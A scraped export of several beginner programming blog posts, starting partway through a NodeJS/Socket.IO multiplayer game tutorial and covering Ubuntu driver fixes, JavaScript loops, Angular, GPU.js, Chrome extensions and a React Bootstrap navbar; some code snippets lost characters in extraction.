experience.&lt;/p&gt;\n&lt;![endif]--&gt;\n&lt;canvas id=\"canvas\"&gt;&lt;/canvas&gt;\n&lt;script src=\"http://192.168.50.48:3000/socket.io/socket.io.js\"&gt;&lt;/script&gt;\n&lt;script src=\"./scripts/player.js\"&gt;&lt;/script&gt;\n&lt;script src=\"./scripts/game.js\"&gt;&lt;/script&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;/pre\n\nMost of the above is simple HTML5 boilerplate code. You will notice that I created a canvas in the body but I did not give it a height or width. We will define that in our javascript code. Also, the following line loads the socket.io client library:\n\npre&lt;script src=\"http://192.168.50.48:3000/socket.io/socket.io.js\"&gt;&lt;/script&gt;/pre\n\nI am only planning on running this locally, so I am not worried about the local IP address. Keep in mind that if you want to test this on other devices, you will not be able to use localhost because it will be local to the client&#8217;s device. Therefore, for testing on another device on my network, I need to define the IP of the computer that&#8217;s running NodeJS.\n\nI also load two additional scripts. One for the player and another one for the game.\n\nFinally, I have a simple *game.css *which contains the following:\n\nprecanvas {\n background-color: #000;\n position: absolute;\n top:0;\n bottom: 0;\n left: 0;\n right: 0;\n margin:auto;\n }/pre\n\nPlayer Class\n\nLet&8217;s create a simple player class. This will go in the player.js file.We will put this file under *public &#8211; scripts &#8211; player.js. *Because we are not going to use any transpiling tools, we are going to stick with constructor functions. Here are the contents of this file:\n\nprefunction Player() {\nthis.id = '';\nthis.x = 0;\nthis.y = 0;\nthis.width = 50;\nthis.height = 50;\nthis.color = '#666';\n}/pre\n\nThe properties of each player will get filled by the server.\n\n{{ ad }}\n\nGame Class\n\nThe final file that we need for our application is the game class. We will put this file under *public &8211; scripts &#8211; game.js. *Let&#8217;s break this file down into parts:\n\npreconst socket = io.connect('http://192.168.50.48:3000');\nconst canvas = document.getElementById('canvas');\nconst ctx = canvas.getContext('2d');\ncanvas.width = 0;\ncanvas.height = 0;\n\nconst myPlayer = new Player();\n\nlet otherPlayers = [];/pre\n\nThe first line connects to socket.io running on our NodeJS server. The next couple of lines define the canvas. Finally, we initialize a new player along with an array of other players. Let&#8217;s add some more:\n\npre(function () {\ngameLoop();// Start the cycle\n}());\n\nfunction gameLoop() {\nwindow.requestAnimationFrame(gameLoop);\ndrawRect();\n}/pre\n\nThis is the a href=\"https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame\" target=\"_blank\" rel=\"noopener\"recommended way of initiating a game loop/a in Javascript. You might have seen many bad examples of using while(true), but don&#8217;t do that. We call a self-invoking function which then calls our gameLoop function. Inside of the gameLoop() we call this cool thing called requestAnimationFrame. Basically, this hooks into the browser&#8217;s refresh cycle and runs on every refresh. This is better because it&#8217;s non-UI blocking and doesn&#8217;t drain your system&#8217;s resources. We also call this function drawRect() which does that actual painting.\n\nHere&#8217;s the drawRect() function:\n\nprefunction drawRect() {\nctx.clearRect(0, 0, 800, 600);\nctx.fillStyle = myPlayer.color; // Fill color of rectangle drawn\nctx.fillRect(myPlayer.x, myPlayer.y, myPlayer.width, myPlayer.height); // draw main player\notherPlayers.forEach((p) =&gt; {\nctx.fillStyle = p.color;\nctx.fillRect(p.x, p.y, 50, 50);\n});\n}/pre\n\nThis function clear the canvas and draws the main player along with all the other players in the otherPlayers array. Now, let&#8217;s add in some movement:\n\nprefunction move(direction) {\nsocket.emit('requestmove', direction);\n}\n\n// move rectangle inside the canvas using arrow keys\nwindow.onkeydown = function (event) {\nconst keyPr = event.keyCode; // Key code of key pressed\nif (keyPr === 68) {\nmove(0);\n} else if (keyPr === 65) {\nmove(180);\n} else if (keyPr === 87) {\nmove(90);\n} else if (keyPr === 83) {\nmove(270);\n}\n};/pre\n\nLet&#8217;s focus first on the onKeydown function. On the key press, it&#8217;s sending in a direction to the move function. This direction correspodings to left, up, right or down (0,180,90,270). The move function sends a request to our server that we want to move, along with the direction. When developing a game (or any web application really) you need to remember that the client is not a trusted source. So you should take information from the client (like increase the x coordinate) and just pass it to the server. It&#8217;s better if you just pass the server the intended input, and let the server decide whether it will grant your request. That allows the server to also be able to validate the coordinates before moving and checking for collision if you wanted.\n\nFinally, let&#8217;s add the Socket.IO event listeners:\n\npresocket.on('create', (data) =&gt; {\ncanvas.width = data.canvasWidth;\ncanvas.height = data.canvasHeight;\nmyPlayer.id = data.id;\n});\n\nsocket.on('gamedata', (data) =&gt; {\nconsole.log(data);\notherPlayers = [];\ndata.forEach((p) =&gt; {\nif (p.id == myPlayer.id) {\nmyPlayer.x = p.x;\nmyPlayer.y = p.y;\nmyPlayer.width = p.width;\nmyPlayer.height = p.height;\nmyPlayer.color = p.color;\n} else {\notherPlayers.push(p);\n}\n});\n});/pre\n\nThe oncreate event listener sets the initial height and width of the canvas along with the player id. We will trigger this event in our server after a client successfully connects. The game data listener gets information for all players and puts them an array. If the player.id is equal to your player, it will update your player&#8217;s coordinates. We also get the color and dimensions from the server.\n\n{{ ad }}\n\nGame Settings:\n\nNow let&8217;s move back to the server side. We are going to create a simple file which will hold the universal game settings. Create a folder called controllers and create a file called gameSettings.js in that folder.\\\\* \\\\*Put the following in it:\n\npremodule.exports = {\nplayerWidth: 50,\nplayerHeight: 50,\ngameWidth: 800,\ngameHeight: 600,\nfps: 16, //16.6 ms for about 60 fps\n};/pre\n\nPlayer Controller\n\nNow create a file called player.js and put it in controllers (controllers &8211; player.js). The player controller will contain all the functions that we will need to interact with the player from the server-side:\n\npreconst gameSettings = require('./gameSettings');\n\nconst players = [];\n\nmodule.exports = {\ngetRandomColor() {\nconst color = [0, 0, 0];\nfor (let i = 0; i &lt; 3; i += 1) {\ncolor[i] = Math.floor(Math.random() * (256 - 0)) + 0;\n}\nreturn color;\n},\n\ngetRandomPosition() {\nconst x = Math.floor(Math.random() * (gameSettings.gameWidth - gameSettings.playerWidth)) + gameSettings.playerWidth;\nconst y = Math.floor(Math.random() * (gameSettings.gameHeight - gameSettings.playerHeight)) + gameSettings.playerHeight;\nreturn [x, y];\n},/pre\n\nWe first import the gameSettings controller and create two functions. getRandomColor() and getRandomPosition(). The getRandomColor() returns an array of 3 random values for rgb. The getRandomPosition() returns a random x,y array that the player will spawn at. Let&#8217;s add some more functionality:\n\npreaddPlayer(id) {\nconst xyCoordinates = this.getRandomPosition();\nconst rgbArray = this.getRandomColor();\nif (!this.exisitingPlayer(id)) {\nplayers.push({\nid,\nwidth: gameSettings.playerWidth,\nheight: gameSettings.playerHeight,\nx: xyCoordinates[0],\ny: xyCoordinates[1],\ncolor: rgba(${rgbArray[0]},${rgbArray[1]},${rgbArray[2]},1),\n});\n}\n},\n\nmove(id, direction) {\nconst player = this.getPlayerById(id);\nif (player) {\nswitch (direction) {\ncase 0:\nif ((player.x + 20) &lt; (gameSettings.gameWidth - (gameSettings.playerWidth / 2))) { player.x += 20; }\nbreak;\ncase 90:\nif ((player.y - 20) &gt; 0) { player.y -= 20; }\nbreak;\ncase 180:\nif ((player.x - 20) &gt; 0) { player.x -= 20; }\nbreak;\ncase 270:\nif ((player.y + 20) &lt; (gameSettings.gameHeight - (gameSettings.playerWidth / 2))) { player.y += 20; }\nbreak;\ndefault:\nconsole.log('no action');\n}\n}\n},\n\ngetPlayerById(id) {\nlet player;\nplayers.forEach(((element, index, array) =&gt; {\nif (element.id == id) {\nplayer = array[index];\n}\n}));\nreturn player;\n},\n\nexisitingPlayer(id) {\nlet existing = false;\nplayers.forEach(((element) =&gt; {\nif (element.id == id) {\nexisting = true;\n}\n}));\nreturn existing;\n},\n\ngetAllplayers() {\nreturn players;\n},\n\nremovePlayer(id) {\nlet index = -1;\nfor (let i = 0; i &lt; players.length; i++) {\nif (players[i].id == id) {\nindex = i;\n}\n}\nplayers.splice(index, 1);\n},\n};/pre\n\nThe addPlayer() checks if the id already exists, if it doesn&#8217;t, it adds a new player to the array of players. The move() function detects the direction that the player wants to and updates the coordinates if it&#8217;s valid. The getPlayerById gets the player by the specified Id and returns it (as an object reference) to the move() function to use. The removePlayer() removes a player from the array.\n\nClient Controller\n\nFinally, create that file called *client.js *(which we specified in the beginning of this tutorial) inside of the controller folder. In this file, we will put all the events for Socket.IO. Begin by writing the following:\n\npreconst playerController = require('./player');\nconst gameSettings = require('./gameSettings');\n\nmodule.exports = function (io) {\nsetInterval(() =&gt; {\nio.sockets.emit('gamedata', playerController.getAllplayers());\n}, gameSettings.fps);\n//more to come....../pre\n\nLike before, we import the game settings. We also import the player controller. Inside of the module.exports we create a setInterval function so that we can send game updates each on a defined interval to all clients. This will be the game loop for our server. You will notiice that gameSettings.fps is defined for 16 ms, which roughly corresponds to 60 fps. a href=\"http://www.david-amador.com/2011/08/hurry-you-only-have-16-ms-to-render-everything/\" target=\"_blank\" rel=\"noopener\"This post will explain why/a.\n\nFinally, let&8217;s add the rest of the event handlers:\n\npreio.on('connection', (socket) =&gt; {\nconsole.log(New connection ${socket.id});\nsocket.emit(\n'create',\n{\ncanvasWidth: gameSettings.gameWidth,\ncanvasHeight: gameSettings.gameHeight,\nid: socket.id\n}\n);\nplayerController.addPlayer(socket.id);\nsocket.on('requestmove', (direction) =&gt; {\nplayerController.move(socket.id, direction);\n});\nsocket.on('disconnect', () =&gt; {\nconsole.log('Client left');\nplayerController.removePlayer(socket.id);\n});\n});\n};/pre\n\nIt might look a little messy, but we only define two event handlers. When the client connects, we emit out a create event with the specified canvas height and width along with the player id (socket id in this case). Next, when the client called requestmove we send the ID and direction to our player controller. Remeber that every 16ms game data is submitting all the players&#8217; updated coordinates. Finally, we handle the client disconnect event.\n\nThat&#8217;s it! When you run the project, you will have a working MMO Game in Javascript and NodeJS. Now all you need to do is add in some actual gameplay and objectives.\n\na href=\"https://github.com/DaveBben/mmorpg-game/tree/master\" target=\"_blank\" rel=\"noopener\"You can find the full project on GitHub./a\n\n&nbsp;\n",
        "tags": [
            "build",
            "game",
            "javascript",
            "mmo",
            "nodejs",
            "socket",
            "websocket"
        ]
    },
    {
        "uri": "/ubuntu-install-hangs-splash-screen-fix/",
        "title": "Ubuntu install Hangs on Splash Screen Fix",
        "content": "When I was trying to install Ubuntu I experienced a very strange issue. The Ubuntu install hangs on splash screen for a very long time. I would select the option to try Ubuntu in the grub menu, and then I would get this strange screen with broken graphics. It looked like the graphics failed to load or something. The Ubuntu install freezes on that screen and would not advance.\n\nI eventually found out that this issue will occur if you are using an Nvidia Graphics card. The proper drivers aren&#8217;t loaded, so you will have to fall back and install the Nvidia drivers. Here&#8217;s how I fixed it:\n\nOn the Grub screen with try Ubuntu, highlight the option and hit e. From there, go to the line that reads Linux and add the following at the end of it:\n\nprenouveau.modeset=0/pre\n\nAfterwards, hit F10 to save changes and boot. Ubuntu should now load into the OS. (These settings aren&#8217;t permanent, you will have to do it every boot until you install the Nvidia drivers)\n\nOnce inside of Ubuntu, you will have to install the official Nvidia drivers. If you are planning to install Ubuntu, I would first run through the initial process, then reboot and enter in the command above again. Afterwards, install the Nvidia drivers using the following command and you are good to go.\n\npresudo apt-get install nvidia-375/pre\n\n&nbsp;\n\n [1]: http://localhost/wordpress/wp-content/uploads/2017/12/ubuntuinstallhangssplashscreen.jpg\n",
        "tags": [
            "proble",
            "solution",
            "ubuntu"
        ]
    },
    {
        "uri": "/javascript-vs-vs/",
        "title": "Javascript for of vs for in vs for each",
        "content": "\nIf you are new to Javascript (or even a seasoned js developer), you will probably get confused when trying to understand the different types of for loops. So let&#8217;s go through the javascript for of vs for in vs for each loop.\n\nStandard for loop\n\nSuppose we have an array called myArray. Here&8217;s how you would iterate through it using the standard for loop:\n\nprevar myArray = ['Cat','Dog','Horse'];\n \nfor(let i =0; i&lt; myArray.length;i+=1){\nconsole.log(myArray[i]);\n}/pre\n\nNo surprise here, this is pretty much standard across all programming languages. This is also (questionably) that fastest way to iterate through. Your output would be:\n\npreCat\n\nDog\n\nHorse/pre\n\nfor each\n\nIf you want to get fancy with shortcuts or you simply like to follow the a href=\"https://github.com/airbnb/javascriptiterators--nope\" target=\"_blank\" rel=\"noopener\"Airbnb coding style guide/a, then you can use the for-each loop. It executes the provided function (or arrow function) for each item in the array:\n\npremyArray.forEach((element)=&gt;{\nconsole.log(element);\n})/pre\n\nThe output would be the same as above.\n\n{{ ad }}\n\nfor of\n\nAnother way to iterate over any iterable object is using for of. Using for of allows you to also iterate through each character in a string or entry in a map. Here&8217;s what it looks like using our previous array:\n\nprefor(let i of myArray){\nconsole.log(i)\n}/pre\n\nThe output would be the same as the other two.\n\nfor in\n\nThis is the one that always confuses everybody. Unlike the previous loops, for in works a little differently. It iterates over the enumerable properties or keys of an object or array. So in this case, if we used for in we get the following:\n\nprefor(let i in myArray){\nconsole.log(i);\n}/pre\n\nOur output would be:\n\npre0\n\n1\n\n2/pre\n\nFor in is mostly useful if you want to iterate through an object&8217;s keys. Say I have the following:\n\nprevar myobj = {first:'Dave',last:'Bennett', birth:''}\n\nfor(let i in myobj){\nif(!myobj[i]){\nconsole.log(Missing ${i})\n}\n}/pre\n\nIt goes through all of the object&#8217;s properties to see if any are blank. If they are, it prints out which property is blank.\n\nSo there&#8217;s all you need to know to get started with the different javascript for of vs for in vs for each.\n",
        "tags": [
            "foreach",
            "iteration",
            "javascript",
            "loop"
        ]
    },
    {
        "uri": "/run-linux-on-surface-laptop/",
        "title": "Run Linux on Surface Laptop",
        "content": "It might be crazy to run Linux on Surface Laptop, but there is a way to do it. If you have extra RAM to spare on your Surface Laptop, just use Virtual Box because you&#8217;ll have all the driver support you need and you will not have to change your boot configuration. For the brave, here&#8217;s how to install Linux on Surface Laptop the more traditional way.\n\ndiv class=\"alert alert-danger\" role=\"alert\"\n  strongBe Careful!/strong Once we change the boot configuration on your Surface Laptop, you will need to enter your recovery key to unlock your hard drive (which is locked by BitLocker by default). You can find this key in your Microsoft Account\n/div\n\nCreate Bootable USB\n\nBegin by creating a bootable USB of your favorite operating system using the free program called a href=\"https://rufus.akeo.ie/\" target=\"blank\" rel=\"noopener\"Rufus/a. For this tutorial, I am going to be using a href=\"https://www.ubuntu.com/\" target=\"blank\" rel=\"noopener\"Ubuntu/a.\n\n Advanced Startup\n\nOn your Surface Laptop, go into the advanced startup settings and click the button that reads restart now.\n\nThis will take you to the advanced startup settings. Go to troubleshoot **and then select to **Change UEFI Firmware Settings.\n\nUEFI Firmware Settings\n\nOnce you are at the UEFI Firmware settings, go to the tab that says *boot. *Change the boot configuration to none then go to exit. When your surface reboots, you&8217;ll be presented with a screen to enter your BitLocker recovery key. This can be obtained from your Microsoft account.\n\nAfter you enter your recovery key, your surface will continue booting into Windows. From there, go to advanced start up one more time and click *restart now. *Now, insert your USB drive with Linux on it.\n\n{{ ad }}\n\nWithin the advanced startup settings, select the option that reads use a device, then go to use a USB device.\n\nFrom this point, it will boot from your USB drive and you will be presented with the Linux grub menu. From this point, you can install Linux on your Surface Laptop or just try it out using the Live mode. Currently, the keyboard driver doesn&#8217;t work with Ubuntu so you will need to use an external keyboard.\n\n [1]: http://localhost/wordpress/wp-content/uploads/2017/12/bitlocker.jpg\n [2]: http://localhost/wordpress/wp-content/uploads/2017/12/boot-usb-device.jpg\n",
        "tags": [
            "linux",
            "surface laptop"
        ]
    },
    {
        "uri": "/subscribe-to-variable-change-in-angular-4-service/",
        "title": "Subscribe to variable change in Angular 4 Service",
        "content": "\nIf you want to subscribe to variable change in Angular 4 service or Angular 5 service, you can use something called the BehaviorSubject from the rxjs library. A behavior subject is like an observable, except that it must be created with an initial value as it is must always return a value even if the subject hasn&#8217;t been updated. A behavior subject will always emit it&#8217;s first value as soon as it&#8217;s described. Here&#8217;s a confusing graph of how it works:\n\nAnyway, you can use a behavior subject in an angular service to subscribe to variables changes in a service. Let&#8217;s build it with a simple example:\n\nAngular Service\n\nSay I have the following service that gets an array of people from a REST API call. I want to save this array as a behavior subject because the REST call can happen at any point in the program and I want a text field to show the size of the array at any given time.\n\nHere are the relevant parts of my Angular service:\n\npreimport { BehaviorSubject } from 'rxjs/BehaviorSubject';\n\nprivate people: Array&lt;Person&gt;;\n\nconstructor( private http: Http) {\n this.people= new Array&lt;Person&gt;();\n this.observablePeople= new BehaviorSubject&lt;Person[]&gt;(this.people);\n }/pre\n\nIn the above lines, I create a new behavior subject and provide my original array to it&8217;s constructor.\n\npreeventChange() {\nthis.observablePeople.next(this.people);\n}/pre\n\nWhenever you want to make changes to a behavior subject, you will need to call the next() function. In this case, I call next() with the people array, so I am overwriting the existing array with the new one that contains updated values.\n\npregetPeople() {\nthis.http.get(url, options).subscribe(res =&gt; {\nlet body = JSON.parse(res.text());\nthis.people= body;\nthis.eventChange();\n})\n}/pre\n\n{{ ad }}\n\nAngular Component\n\nInside of the Angular component, here are the relevant parts:\n\npreimport { Subscription } from 'rxjs/Subscription';\n\nprivate subscription: Subscription;\n\npublic crowd: People[];\n\nconstructor(private alertService: AlertService) {\n}\n\nngOnInit() {\nthis.subscription = this.alertService.observablePeople\n.subscribe(item =&gt; {\nthis.crowd= item;\n});\n\n}/pre\n\nIn the component, the subscribe event will get fired everytime next() is called on the bheavior subject. Since I am pushing a whole array with my next() function, the item that subscribe will receive will be a new array.\n\nThat&8217;s all there is to it.\n\n&nbsp;\n\n&nbsp;\n",
        "tags": [
            "angular",
            "angular 4",
            "service",
            "subscribe"
        ]
    },
    {
        "uri": "/image-classification-using-nvidia-digits-deep-learning/",
        "title": "Image Classification using Nvidia Digits – Deep Learning",
        "content": "\nNvidia digits is a great way to get started with deep learning and image classification. It&#8217;s an open source platform that you can run on your computer to do things like image classification, object detection, and processing. It also contains a REST API so that you can easily do all of this through HTTP requests if you desire. For this tutorial, let&#8217;s take a look at image classification using Nvidia digits.\n\nBefore you begin, you will need to a href=\"https://github.com/NVIDIA/DIGITS/blob/master/docs/BuildDigits.md\" target=\"_blank\" rel=\"noopener\"follow the build instructions/a to get Nvidia Digits running on your computer. I recommend that you use Ubuntu, otherwise you will have to go through a lot of annoying installations to get this working on Windows. Also, you will need to have a Nvidia GPU. While training on your CPU is possible, it will take significantly longer to complete.\n\nDataset\n\nYou will first need a dataset to work with. You can find your own images or use an existing dataset like a href=\"http://www.vision.caltech.edu/ImageDatasets/Caltech101/\" target=\"blank\" rel=\"noopener\"this one/a. Just make sure that you have a top-level folder and each of your categories in a sub-folder. For example, I have a top level folder named things. I then have two folders in that folder. One folder named planes (containing all my images of planes) and another one named helicopters (containing all my images of helicopters).\n\n Building Dataset\n\nBegin by starting Digits and opening your browser to localhost:5000. We will start with building a dataset that can be used with your models. Go to the tab that says dataset and chooses a new classification.\n\n&nbsp;\n\nThe neat thing about Nvidia digits is that it takes care of sizing your images to the appropriate size and color scheme that the network requires. Set the transform options to fill if your images are smaller than the 256&#215;256 dimension, otherwise, select crop or squash. Then select the top level folder which contains all the other sub-folders of the images you want to classify. Finally, name your dataset and select create.\n\nTraining the Model\n\nAfter you create your dataset, select the tab that says _Models _and create a new classification model.\n\nFirst, select the dataset that you created in the previous step. You might also want to adjust the learning rate to 0.001 if you find that your network&8217;s loss rate is extremely high. Also, set the batch size to some value between 1-10 if you plan to use the GoogleNet.  If you keep it at the default size with the GoogleNet, you will most likely run out of GPU memory unless you are using multiple GPUS. Finally, give your model a name and select create.\n\nThe training on your model will begin. Depending on your computer&#8217;s hardware, this could take awhile. When it&#8217;s done, test the network with an image that you did not train it with and see if the output is as expected.\n\n[1]: http://localhost/wordpress/wp-content/uploads/2017/12/classification.jpg\n[2]: http://localhost/wordpress/wp-content/uploads/2017/12/dataset.jpg\n[3]: http://localhost/wordpress/wp-content/uploads/2017/12/models.jpg\n[4]: http://localhost/wordpress/wp-content/uploads/2017/12/classification-model.jpg\n[5]: http://localhost/wordpress/wp-content/uploads/2017/12/done-training.jpg\n[6]: http://localhost/wordpress/wp-content/uploads/2017/12/test-image.jpg\n",
        "tags": [
            "ai",
            "deep learning",
            "image classification",
            "machine learning",
            "nvidia"
        ]
    },
    {
        "uri": "/gpu-programming-in-javascript/",
        "title": "GPU Programming in Javascript",
        "content": "\nYou probably don&#8217;t think about Javascript when you hear the words GPU programming. However, it should come as no surprise that there is a library to do anything and that includes GPU Programming in Javascript. Let&#8217;s get one thing clear though, you should probably not do this if you are looking to do serious GPU programming. For serious GPU programming, I recommended that you work with Nvidia&#8217;s CUDA in C and C++. See, the only way to get direct access to the GPU in Javascript is through WebGL. That means that anything you do will essentially be converted to pixels and shaders to run on the GPU then converted back to your desired output. Luckily, a library called a href=\"http://gpu.rocks/\" target=\"_blank\" rel=\"noopener\"gpu.js/a simplifies all of this for us, but it&#8217;s still not an ideal situation.\n\nHere&#8217;s another thing to keep in mind before you jump in. Just because something can run on the GPU doesn&#8217;t mean that it should. The GPU really excels with doing simple things in parallel on large amounts of data. For example, multiplication on very large matrices is a perfect example of the power of GPU processing over the CPU. So let&#8217;s implement some simple GPU programming in Javascript using matrix multiplication.\n\n{{ ad }}\n\nIndex HTML\n\nSInce we are designing this to run in the browser, we will need to create a simple index.html file. If you want to work with NodeJS you can, but you will fallback on CPU support because WebGL is currently not accessible in NodeJS, which is required for this library to work. Begin by creating a simple Index.html file and linking the gpu.js library and a custom javascript file that we will write.\n\npre&lt;!DOCTYPE html&gt;\n &lt;html lang=\"en\"&gt;\n &lt;head&gt;\n &lt;title&gt;&lt;/title&gt;\n &lt;meta charset=\"UTF-8\"&gt;\n &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;\n &lt;link href=\"css/style.css\" rel=\"stylesheet\"&gt;\n &lt;/head&gt;\n &lt;body&gt;\n &lt;script src=\"./gpu.min.js\"&gt;&lt;/script&gt;\n &lt;script src=\"./gpu.js\"&gt;&lt;/script&gt;\n &lt;/body&gt;\n &lt;/html&gt;/pre\n\n GPU Programming\n\nNow let&#8217;s start writing our first GPU program. We are going to multiple a very large matrix agaisnt itself. Begin by createing an instance of the GPU library.\n\npreconst gpu = new GPU();/pre\n\nNext, we are going to define a constant that will determine the size of the matrix (length and width).\n\npreconst SIZE = 1000;/pre\n\nNow, let&#8217;s create a 2D array to represent our matrix. I am going to fill this array with random numbers.\n\npreconst value = [];\nfor (let i = 0; i &lt; SIZE; i++) {\nconst row = [];\nfor (j = 0; j &lt; SIZE; j++) {\nrow.push(Math.random() * (1000 - 1 + 1) + 1);\n}\nvalue.push(row);\n}/pre\n\nIf we were to print this, you will see a matrix containing 1000 rows and 1000 columns. We are going to multiply this matrix by itself. Now, let&#8217;s invoke the kernel function on the GPU.\n\npreconst matMult = gpu.createKernel(function (a, b) {\nlet sum = 0;\nfor (let i = 0; i &lt; size; i++) {\nsum += athis.thread.y * bi;\n}\nreturn sum;\n} , {\nconstants: { size: SIZE },\noutput: [SIZE,SIZE],\n});/pre\n\nI&#8217;m creating a function on the kernel that will traverse two matrices (in this case our same matrix against itself). This.thread.x and this.thread.y refers to the x and y position of each of the matrices. Since this will be running on WebGL, you are limited to the math operations at your disposal. Also, all loops need to be bound. So you can&#8217;t do for(i=0;i<n;i+=1), instead of that *n* either needs to be a hardcoded number or a fixed constant.\n\n{{ ad }}\n\nFinally, we are declaring the output size of the matrix. Now, let&#8217;s log the output.\n\npreconst result = matMult(value, value);\nconsole.log(result);/pre\n\nWhen you launch the index.html file and run this you will notice your GPU usage spike for half a second, and then you will have the product of the matrix multiplication. Now, if you tried this exact code using NodeJS (which will keep you CPU bound) you will notice that it will take roughly 10 seconds to solve. That&#8217;s a big difference in time from using the GPU.\n\na href=\"https://github.com/DaveBben/gpu-programming\" target=\"_blank\" rel=\"noopener\"You can find this code over on GitHub./a\n",
        "tags": [
            "cuda",
            "gpu",
            "javascript"
        ]
    },
    {
        "uri": "/best-chrome-extensions-for-web-development/",
        "title": "Best Chrome Extensions for Web Development",
        "content": "\nGoogle Chrome and its developer tools are an absolute necessity for any web developer. But you shouldn&#8217;t stop there because there are even more great tools and extensions that will help you with web development and design. So let&#8217;s take a look at some of the best Chrome extensions for web development.\n\na href=\"https://chrome.google.com/webstore/detail/react-developer-tools/fmkadmapgofadopljbjfkapdkoienihi?utmsource=chrome-ntp-icon\" target=\"blank\" rel=\"noopener\"React Developer Tools/a\n\nIf you plan on doing development in React, then you should definitely download this extension. It makes debugging a lot easier because you can see your whole app&8217;s hierarchy and look at the values for each state and prop from all of your components. It also gives you an overview of all the functions within that component and their current value. Before discovering about React develop tools, I was dependent on console logging. Using this plugin has saved me lots of frustration.\n\na href=\"https://chrome.google.com/webstore/detail/fatrank-keyword-rank-chec/jcnfkjjanbdfabigknbedgkfjkljhbdn?utmsource=chrome-ntp-icon\" target=\"blank\" rel=\"noopener\"FATRANK/a\n\nSo this extension is less for web development and more for good SEO optimization. It is an extension that has recently transformed that way I deal with writing articles and keywords. With Fatrank, you navigate to one of your website&8217;s pages and type in a keyword from the page (the page title for example). The extension will then tell you what position of Google search results that your page is on. For anyone dealing with SEO optimization, this is an absolute must-have extension.\n\na href=\"https://chrome.google.com/webstore/detail/colorpick-eyedropper/ohcpnigalekghcmgcdcenkpelffpdolg\" target=\"_blank\" rel=\"noopener\"ColorPick Eyedropper/a\n\nThis extension is very straightforward; it allows you to get the hex color value of anything on a page. I use this all the time for web design as there is often a particular color that I like from another site that I want to use. It&8217;s a little quicker than trying to open up the Chrome dev tools and finding the element to get its color value.\n\na href=\"https://chrome.google.com/webstore/detail/whatfont/jabopobgcpjmedljpbcaablpmlmfcogm?utmsource=chrome-ntp-icon\" target=\"blank\" rel=\"noopener\"WhatFont/a\n\nThis is another extension that I use for web design. It allows you to see the font details of any text on the page. You can see the font name, weight, line-height, and color. Again, it&8217;s really useful when I see a font on another website that I like and want to use.\n\na href=\"https://chrome.google.com/webstore/detail/clear-cache/cppjkneekbjaeellbfkmgnhonkkjfpdn?utmsource=chrome-ntp-icon\" target=\"blank\" rel=\"noopener\"Clear Cache/a\n\nThis extension does exactly what you think. With a click of a button, it will clear whatever cache you desire. It might seem a little trivial, but when you&8217;re dealing with SPAs a lot, cache control becomes a very big problem.\n\na href=\"https://chrome.google.com/webstore/detail/jsonview/chklaanhfefbnpoihckbnefhakgolnmc?utmsource=chrome-ntp-icon\" target=\"blank\" rel=\"noopener\"JSONView/a\n\nJsonView will neatly format any JSON that you open up in the browser. It&8217;s especially useful when working with REST API&#8217;s and validating the JSON request or response.\n",
        "tags": [
            "chrome extensions",
            "web development"
        ]
    },
    {
        "uri": "/bootstrap-navbar-collapse-reactjs/",
        "title": "Bootstrap Navbar Collapse in ReactJS",
        "content": "\nBootstrap is an amazing library and works wonders with ReactJS. Unfortunately, you can&#8217;t (or really shouldn&#8217;t) use Bootstrap.js with React because bootstrap directly manipulates the DOM; which could break React&#8217;s nice rendering flow. This becomes a big problem if you wanted to implement a Navbar using plain bootstrap. Take the following for example from a href=\"https://getbootstrap.com/docs/4.0/components/navbar/#nav\" target=\"_blank\" rel=\"noopener\"Bootstrap&#8217;s documentatio/an:\n\n&nbsp;\n\nYou could directly take this code and put it in ReactJS (but change class _to _className) and you will have a working Navbar. If you tried viewing this on mobile then you sill get the following:\n\n&nbsp;\n\nNothing wrong right? This is perfectly expected behavior. The only problem is that if you click on the navbar collapse hamburger button, nothing will happen. This is because you need to use Bootstrap.js to change the class, which you&#8217;re not using because you shouldn&#8217;t mix Bootstrap.js and React. So span style=\"background-color: #f6d5d9;\"one /spansolution is to use a bootstrap library built directly for Reactjs. However, I hate this idea because I don&#8217;t need a whole library for something I could easily fix. So let&#8217;s take a look at how to do it.\n\n{{ ad }}\n\nBootstrap Navbar Collapse in ReactJS\n\nIn order make the Navbar appear when the toggle button is selected, we just need to add a class to the Navbar and an onClick handler to the button. Bootstrap.css takes care of the visibility. Here is the entire code of my Navbar.js component I created:\n\npreimport React, { Component } from 'react';\n import { Link } from 'react-router-dom';\n\nclass Nav extends Component {\n constructor(props) {\n super(props);\n this.toggleNavbar = this.toggleNavbar.bind(this);\n this.state = {\n collapsed: true,\n };\n }\n toggleNavbar() {\n this.setState({\n collapsed: !this.state.collapsed,\n });\n }\n render() {\n const collapsed = this.state.collapsed;\n const classOne = collapsed ? 'collapse navbar-collapse' : 'collapse navbar-collapse show';\n const classTwo = collapsed ? 'navbar-toggler navbar-toggler-right collapsed' : 'navbar-toggler navbar-toggler-right';\n return (\n &lt;nav className=\"navbar navbar-expand-lg navbar-dark bg-dark transparent-nav\"&gt;\n &lt;div className=\"container\"&gt;\n &lt;a className=\"navbar-brand\" href=\"\"&gt;Rate My Neighborhood&lt;/a&gt;\n &lt;button onClick={this.toggleNavbar} className={${classTwo}} type=\"button\" data-toggle=\"collapse\" data-target=\"#navbarResponsive\" aria-controls=\"navbarResponsive\" aria-expanded=\"false\" aria-label=\"Toggle navigation\"&gt;\n &lt;span className=\"navbar-toggler-icon\" /&gt;\n &lt;/button&gt;\n &lt;div className={${classOne}} id=\"navbarResponsive\"&gt;\n &lt;ul className=\"navbar-nav ml-auto\"&gt;\n &lt;li className=\"nav-item active\"&gt;\n &lt;Link className=\"nav-link\" to=\"/\"&gt;Home&lt;/Link&gt;\n &lt;/li&gt;\n &lt;li className=\"nav-item\"&gt;\n &lt;Link className=\"nav-link\" to=\"/about\"&gt;About&lt;/Link&gt;\n &lt;/li&gt;\n &lt;/ul&gt;\n &lt;/div&gt;\n &lt;/div&gt;\n &lt;/nav&gt;\n );\n }\n }\nexport default Nav;\n/pre\n\nIn the component&#8217;s state, I defined a collapse boolean. Then in the render function, I check to see if the collapsed component is true. If it is, I change the class of the navbarResponsive div. In addition, if collapse is true, then I also have to change the class of the button. Here are the relevant pieces of code:\n\npreconst collapsed = this.state.collapsed;\n const classOne = collapsed ? 'collapse navbar-collapse' : 'collapse navbar-collapse show';\n const classTwo = collapsed ? 'navbar-toggler navbar-toggler-right collapsed' : 'navbar-toggler navbar-toggler-right';\n return (\n &lt;nav className=\"navbar navbar-expand-lg navbar-dark bg-dark transparent-nav\"&gt;\n 